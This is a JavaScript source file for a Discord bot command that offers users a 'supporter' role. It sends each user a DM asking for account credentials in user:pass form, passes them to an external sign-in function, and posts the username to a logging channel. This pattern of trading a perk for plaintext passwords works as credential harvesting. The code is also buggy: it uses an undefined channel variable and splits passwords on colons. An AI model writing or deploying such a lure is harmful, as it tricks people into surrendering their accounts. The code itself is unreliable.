require('dotenv').config();
const { signIn, sendNotification } = require('../utils/functions');

module.exports = {
    name: 'givesupporter',
    description: 'Gives the user the support role',
    execute: async (client, message) => {
        const roleID = '1234182734180778036';
        const role = message.guild.roles.cache.get(roleID);

        if (!role) {
            throw new Error('Role Not Found For This Server.');
        }

        if (message.member.roles.cache.has(roleID)) {
            message.reply('You Already Have The Supporter Role.');
            return;
        }

        message.reply('Check DMs!');
        message.author.send(`Please Send Your Account Info Using This Format: \`user:pass\``);

        const dmCollector = message.author.dmChannel
            ? message.author.dmChannel.createMessageCollector({
                  filter: (msg) => msg.author.id === message.author.id,
                  max: 1,
              })
            : await message.author.createDM().then((channel) =>
                  channel.createMessageCollector({
                      filter: (msg) => msg.author.id === message.author.id,
                      max: 1,
                  })
              );

        dmCollector.on('collect', async (msg) => {
            const dmContent = msg.content.trim();
            const format = /^(.+?):(.+?)$/;

            if (format.test(dmContent)) {
                const [username, password] = dmContent.split(':');
                try {
                    const success = await signIn(username, password);
                    if (success) {

                        if (!channel) {
                            message.author.send('Could not find the notification channel.');
                            return;
                        }
                        await sendNotification(`I Have Given ${message.author} Supporter Role. Username Used: \`${username}\``, 1095996435767496714, 1137205056752586783)
                        message.author.send('You Have Been Given The Supporter Role.');
                        await message.member.roles.add(role);
                        return;
                    } else {
                        message.author.send(`Invalid Username/Password (Case Sensitive)`);
                        return;
                    }
                } catch (error) {
                    console.error('Error sending notification:', error);
                    message.author.send('Your Request Failed To Send. Please Try Again Later.');
                }
            } else {
                message.author.send(`Invalid Format. Please Use The Following Format: \`user:pass\``);
            }
        });
    },
};
